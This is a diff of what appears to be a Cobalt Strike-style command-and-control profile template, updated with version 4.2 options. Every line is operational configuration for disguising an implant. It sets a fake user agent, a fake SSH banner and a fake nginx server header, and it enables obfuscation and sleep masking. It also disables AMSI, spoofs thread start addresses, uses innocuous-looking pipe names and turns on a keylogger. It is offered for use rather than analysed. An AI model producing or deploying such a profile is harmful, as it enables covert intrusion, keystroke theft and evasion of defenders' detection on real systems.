@@ -1,5 +1,5 @@
 #clean template profile - no comments, cleaned up, hopefully easier to build new profiles off of.
-#updated with 4.x options, added sections for new variant options. Variants can be used on http-get, http-post, http-stager, and https-certificate blocks.
+#updated with 4.2 options
 #xx0hcd
 
 ###Global Options###
@@ -9,7 +9,7 @@ set sleeptime "37500";
 set jitter    "33";
 set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";
 
-#set host_stage "false";
+set host_stage "false";
 
 ###DNS options###
 set dns_idle "8.8.8.8";
@@ -29,8 +29,9 @@ set smb_frame_header "";
 set tcp_port "8000";
 set tcp_frame_header "";
 
-###SSH Banner###
+###SSH options###
 set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
+set ssh_pipename "SearchTextHarvester##";
 
 ###SSL Options###
 #https-certificate {
@@ -57,7 +58,6 @@ https-certificate {
 ###HTTP-Config Block###
 http-config {
     set headers "Server, Content-Type";
-    header "Content-Type" "text/html;charset=UTF-8";
     header "Server" "nginx";
 
     set trust_x_forwarded_for "false";
@@ -281,6 +281,12 @@ stage {
     set obfuscate	"true";
     set rich_header     "";
     
+    #new 4.2. options   
+    #set allocator "HeapAlloc";
+    #set magic_mx_x86 "MZRE";
+    #set magic_mz_x64 "MZAR";
+    #set magic_pe "PE";
+    
     set sleep_mask "true";
     set smartinject "true";
 
@@ -351,5 +357,10 @@ post-ex {
     set smartinject "true";
 
     set amsi_disable "true";
+    
+    #new 4.2 options
+    set thread_hint "ntdll.dll!RtlUserThreadStart";
+    set pipename "DserNamePipe##";
+    set keylogger "SetWindowsHookEx";
 
 }
